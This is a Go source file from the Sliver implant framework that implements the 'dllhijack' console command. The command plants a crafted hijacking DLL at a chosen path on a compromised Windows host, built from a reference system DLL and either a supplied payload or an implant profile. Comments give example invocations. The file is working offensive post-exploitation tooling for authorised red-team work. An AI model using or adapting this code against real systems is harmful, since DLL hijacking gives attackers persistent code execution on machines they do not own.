package dllhijack

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"io/ioutil"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/desertbit/grumble"
)

// dllhijack --ref-path c:\windows\system32\msasn1.dll --file /tmp/runner.dll TARGET_PATH
// dllhijack --ref-path c:\windows\system32\msasn1.dll --profile dll  TARGET_PATH
// dllhijack --ref-path c:\windows\system32\msasn1.dll --ref-file /tmp/ref.dll --profile dll  TARGET_PATH

// DllHijackCmd -- implements the dllhijack command
func DllHijackCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	var (
		localRefData  []byte
		targetDLLData []byte
		err           error
	)
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	targetPath := ctx.Args.String("target-path")
	referencePath := ctx.Flags.String("reference-path")
	localFile := ctx.Flags.String("file")
	profileName := ctx.Flags.String("profile")
	localReferenceFilePath := ctx.Flags.String("reference-file")

	if referencePath == "" {
		con.PrintErrorf("Please provide a path to the reference DLL on the target system\n")
		return
	}

	if localReferenceFilePath != "" {
		localRefData, err = ioutil.ReadFile(localReferenceFilePath)
		if err != nil {
			con.PrintErrorf("Could not load the reference file from the client: %s\n", err)
			return
		}
	}

	if localFile != "" {
		if profileName != "" {
			con.PrintErrorf("please use either --profile or --File")
			return
		}
		targetDLLData, err = ioutil.ReadFile(localFile)
		if err != nil {
			con.PrintErrorf("Error: %s\n", err)
			return
		}
	}

	ctrl := make(chan bool)
	msg := fmt.Sprintf("Crafting and planting DLL at %s ...", targetPath)
	con.SpinUntil(msg, ctrl)
	_, err = con.Rpc.HijackDLL(context.Background(), &clientpb.DllHijackReq{
		ReferenceDLLPath: referencePath,
		TargetLocation:   targetPath,
		ReferenceDLL:     localRefData,
		TargetDLL:        targetDLLData,
		Request:          con.ActiveTarget.Request(ctx),
		ProfileName:      profileName,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error: %s\n", err)
		return
	}

	con.PrintInfof("DLL uploaded to %s\n", targetPath)
}
